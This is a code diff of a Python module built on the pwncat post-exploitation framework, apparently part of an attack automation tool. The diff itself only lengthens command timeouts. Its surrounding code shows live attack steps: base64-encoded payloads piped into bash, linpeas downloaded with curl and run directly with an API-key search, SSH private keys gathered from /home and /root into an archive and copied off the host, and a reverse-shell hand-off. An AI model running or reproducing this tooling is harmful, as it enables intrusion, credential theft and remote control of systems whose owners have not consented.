@@ -57,19 +57,19 @@ def execute(session: pwncat.manager.Session, task):
             payload = base64.b64encode(str(args.payload).encode("utf-8"))
             result = session.platform.run(
                 f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_connector | base64 -d | /bin/bash'",
-                cwd="/tmp", timeout=900)
+                cwd="/tmp", timeout=7200)
             session.log(result)
         elif task == "scan2kubeshell":
             payload = base64.b64encode(
                 b'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex')
             result = session.platform.run(
                 f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_connector_linpeas | base64 -d | /bin/bash'",
-                cwd="/tmp", timeout=900)
+                cwd="/tmp", timeout=7200)
             session.log(result)
 
             result = session.platform.run(
                 'rm -f /tmp/ssh_keys.tar /tmp/ssh_keys.tar.gz 2>/dev/null; for f in $(find  /home /root -name .ssh 2>/dev/null | xargs -I {} find {} -type f); do if grep "PRIVATE" $f >/dev/null; then tar -C $(dirname $f) -rvf /tmp/ssh_keys.tar $f 2>/dev/null; fi done; gzip /tmp/ssh_keys.tar',
-                cwd="/tmp", timeout=900)
+                cwd="/tmp", timeout=7200)
             session.log(result)
 
             session.log("copying /tmp/ssh_keys.tar.gz...")
@@ -93,7 +93,7 @@ def execute(session: pwncat.manager.Session, task):
             session.log("running scan payload...")
             result = session.platform.run(
                 f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_connector_scan | base64 -d | /bin/bash'",
-                cwd="/tmp", timeout=900)
+                cwd="/tmp", timeout=7200)
             session.log(result)
 
             files = ["/tmp/scan.json", "/tmp/hydra-targets.txt",
@@ -127,7 +127,7 @@ done'''.encode("utf-8"))
                 f"starting reverse shell hand off on remote host off via ssh: {payload}")
             result = session.platform.run(
                 f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_connector_ssh_reverse_shell | base64 -d | /bin/bash'",
-                cwd="/tmp", timeout=900)
+                cwd="/tmp", timeout=7200)
 
             session.log("connector session complete")
     except Exception as e:
